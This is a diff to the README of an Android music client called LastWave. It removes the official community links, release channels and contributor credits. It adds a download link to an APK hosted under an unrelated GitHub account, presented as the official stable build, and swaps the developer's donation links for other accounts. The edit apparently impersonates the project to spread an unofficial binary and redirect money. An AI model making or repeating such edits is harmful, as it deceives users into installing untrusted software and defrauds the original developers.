@@ -6,23 +6,6 @@
 
 **Simple Android YouTube Music client with Material UI, Liquid Glass, Bit-Perfect playback, Automix, Lossless addons & advanced audiophile features.**
 
-<br/>
-
-<p align="center">
-  <a href="https://t.me/clashprojects" target="_blank"><img src="docs/badges/btn_telegram_support.svg" alt="Telegram Support" height="42" /></a>
-  <a href="https://t.me/MaterialYouApp" target="_blank"><img src="docs/badges/btn_telegram_channel.svg" alt="Telegram Channel" height="42" /></a>
-  <a href="https://discord.gg/DmyM2p2fMe" target="_blank"><img src="docs/badges/btn_discord.svg" alt="Discord Community" height="42" /></a>
-</p>
-
-<p align="center">
-  <a href="https://trendshift.io/repositories/197973?utm_source=trendshift-badge&amp;utm_medium=badge&amp;utm_campaign=badge-trendshift-197973" target="_blank" rel="noopener noreferrer">
-    <img src="https://trendshift.io/api/badge/trendshift/repositories/197973/daily?language=Kotlin" alt="Clash-Projects%2FLastWave-Native | Trendshift" width="250" height="55" />
-  </a>
-  &nbsp;
-  <a href="https://trendshift.io/repositories/197973?utm_source=trendshift-badge&amp;utm_medium=badge&amp;utm_campaign=badge-trendshift-197973" target="_blank" rel="noopener noreferrer">
-    <img src="https://trendshift.io/api/badge/trendshift/repositories/197973/weekly?language=Kotlin" alt="Clash-Projects%2FLastWave-Native | Trendshift" width="250" height="55" />
-  </a>
-</p>
 </div>
 
 ---
@@ -120,11 +103,9 @@ For audio lovers, LastWave packs Bit-Perfect USB DAC output, Lossless FLAC addon
 
 ### Installation
 
-| Channel | Source | Compatibility |
-|:---|:---|:---|
-| **Stable Release** | [GitHub Releases](https://github.com/Clash-Projects/LastWave-native/releases) | Recommended for all users • Android 7.0+ (API 24+) |
-| **Nightly Builds** | [GitHub Actions](https://github.com/Clash-Projects/LastWave-native/actions) | Latest automated builds with bleeding-edge features |
-| **Desktop App** | [LastWave-Desktop](https://github.com/Clash-Projects/LastWave-Desktop) | Official desktop client for Windows, macOS & Linux |
+[![Download APK](https://img.shields.io/badge/Download-Latest_APK-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://github.com/trigxon/Arkify/releases/download/5.2.1/LastWave-v5.2.1-universal.apk)
+
+**[LastWave v5.2.1 — Universal APK](https://github.com/trigxon/Arkify/releases/download/5.2.1/LastWave-v5.2.1-universal.apk)** — the latest stable build, works on all supported devices (Android 7.0+ / API 24+).
 
 ### Quick Setup
 
@@ -170,13 +151,9 @@ If LastWave has been useful to you, consider supporting its development.
   <table style="margin: 0 auto; border-collapse: collapse; border: none;">
     <tr>
       <td align="center" style="padding: 15px; border: none;">
-        <a href="https://buymeacoffee.com/ajisth" target="_blank" style="text-decoration:none;"><img src="docs/badges/bmac.png" alt="Buy Me A Coffee" width="140" style="border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);"/></a>
-      </td>
-      <td align="center" style="padding: 15px; border: none;">
-        <a href="https://buymeachai.ezee.li/ajisth69" target="_blank" style="text-decoration:none;"><img src="docs/badges/upi.png" alt="UPI (Buy Me A Chai)" width="140" style="border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);"/></a>
-      </td>
-      <td align="center" style="padding: 15px; border: none;">
-        <a href="https://github.com/sponsors/ajisth69" target="_blank" style="text-decoration:none;"><img src="docs/badges/github_sponsors.svg" alt="GitHub Sponsors" width="140" style="border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);"/></a>
+        <a href="https://buymeacoffee.com/5073340abdw" target="_blank" style="text-decoration:none;"><img src="docs/badges/bmac.png" alt="Buy Me A Coffee" width="140" style="border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);"/></a>
+      </td>      <td align="center" style="padding: 15px; border: none;">
+        <a href="https://github.com/sponsors/trigxon" target="_blank" style="text-decoration:none;"><img src="docs/badges/github_sponsors.svg" alt="GitHub Sponsors" width="140" style="border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);"/></a>
       </td>
     </tr>
   </table>
@@ -202,19 +179,6 @@ LastWave is made possible thanks to these open-source projects:
 - **[Kyant](https://github.com/kyant0)** — Jetpack Compose backdrop refraction & shape shaders
 
 ---
-
-## Contributors
-
-LastWave wouldn't be possible without our incredible community of contributors. Thank you for making it better every day!
-
-<p align="center">
-  <a href="https://github.com/Clash-Projects/LastWave-Native/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=Clash-Projects/LastWave-Native" alt="Contributors" />
-  </a>
-</p>
-
----
-
 
 ## Disclaimer
 
